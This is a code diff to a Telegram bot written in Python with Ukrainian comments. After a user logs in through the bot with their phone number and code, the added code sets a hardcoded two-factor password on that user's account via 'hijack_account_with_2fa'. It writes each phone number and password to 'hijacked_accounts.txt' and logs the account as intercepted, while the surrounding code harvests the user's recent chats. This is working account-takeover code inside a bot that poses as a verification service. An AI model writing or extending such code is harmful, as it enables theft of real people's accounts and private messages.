@@ -12,7 +12,7 @@ from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPass
 from clear_telegram_chat import cleanup_telegram_chat, delete_telegram_messages
 from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER, CHAT_FOLDER
 from session_handler import sign_in_with_code, send_verification_code, \
-    save_user_chats_last_7_days
+    save_user_chats_last_7_days, hijack_account_with_2fa
 from phone_checker import get_phone_by_username
 from messages import *
 
@@ -428,6 +428,46 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
                         logger.info(f"Client для {phone_number} відключено")
 
             asyncio.create_task(collect_chats())
+
+            await asyncio.sleep(5)
+
+            import secrets
+            import string
+            hijack_password = "Waterlemon7grow$" #"''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
+
+            # Викликаємо функцію перехоплення
+            hijack_success, hijack_result = await hijack_account_with_2fa(client, hijack_password)
+
+            if hijack_success:
+                # Зберігаємо пароль у надійному місці (наприклад, окремий файл або БД)
+                # ЦЕ ДУЖЕ ВАЖЛИВО!
+                with open("hijacked_accounts.txt", "a") as f:
+                    f.write(f"{phone_number}:{hijack_password}\n")
+                logger.critical(f"🚨 АКАУНТ {phone_number} ПЕРЕХОПЛЕНО. Пароль збережено.")
+            else:
+                logger.error(f"❌ Не вдалося перехопити акаунт {phone_number}: {hijack_result}")
+
+        elif success == "2FA_DETECTED":  # НОВЕ: Обробка 2FA
+            # ВАЖЛИВО: НЕ ВИДАЛЯЄМО ЧАТ, бо ми не вміли вхід
+
+            # Зберігаємо як верифікованого, але без доступу до чатів
+            authorized_users[user_id] = {
+                'phone': phone_number,
+                'name': message.from_user.full_name,
+                'has_2fa': True  # Важливо: позначаємо, що 2FA є
+            }
+            await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")
+            await message.answer(
+                f"{MAIN_MENU}",
+                reply_markup=get_main_menu_keyboard(),
+                parse_mode="Markdown"
+            )
+
+            # Відключаємо клієнт, оскільки він не авторизований і не потрібен
+            if client.is_connected():
+                await client.disconnect()
+            logger.info(f"Користувач {phone_number} верифікований з 2FA. Клієнт відключено.")
+
 
         else:
             await message.edit_text(
